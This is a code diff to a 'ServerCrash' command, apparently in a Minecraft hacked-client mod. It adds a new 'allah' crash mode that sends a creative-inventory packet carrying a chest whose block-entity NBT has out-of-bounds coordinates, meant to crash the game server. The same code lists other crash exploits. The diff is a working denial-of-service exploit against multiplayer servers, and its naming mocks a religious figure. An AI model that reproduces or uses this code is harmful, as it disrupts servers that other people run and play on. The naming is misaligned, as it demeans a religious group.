@@ -46,7 +46,7 @@ public class ServerCrash extends Command {
 
     @Override
     public PossibleArgument getSuggestionsWithType(int index, String[] args) {
-        return StaticArgumentServer.serveFromStatic(index, new PossibleArgument(ArgumentType.STRING, "rider", "book", "malformednbt", "move", "papertest", "chunkoob", "mvcrash", "stackoverflow", "playtime", "playtimeold", "maptool", "fawe", "lag"), new PossibleArgument(ArgumentType.NUMBER, "(power)"));
+        return StaticArgumentServer.serveFromStatic(index, new PossibleArgument(ArgumentType.STRING, "rider", "book", "malformednbt", "move", "papertest", "chunkoob", "mvcrash", "stackoverflow", "playtime", "playtimeold", "maptool", "fawe", "lag", "allah"), new PossibleArgument(ArgumentType.NUMBER, "(power)"));
     }
 
     @Override
@@ -66,6 +66,20 @@ public class ServerCrash extends Command {
                     theFuckingNetworkHandler.sendPacket(new VehicleMoveC2SPacket(ridingEntity));
                 }
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Riding Crash Exploit");
+            }
+
+
+            case "allah" -> {
+                ItemStack ez = new ItemStack(Items.CHEST, 1);
+                NbtCompound nbt = new NbtCompound();
+                nbt.put("x", NbtDouble.of(2147483647));
+                nbt.put("y", NbtDouble.of(0));
+                nbt.put("z", NbtDouble.of(2147483647));
+                NbtCompound fuck = new NbtCompound();
+                fuck.put("BlockEntityTag", nbt);
+                ez.setNbt(fuck);
+                theFuckingNetworkHandler.sendPacket(new CreativeInventoryActionC2SPacket(39, ez));
+                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Allah's Crash");
             }
 
             case "book" -> {
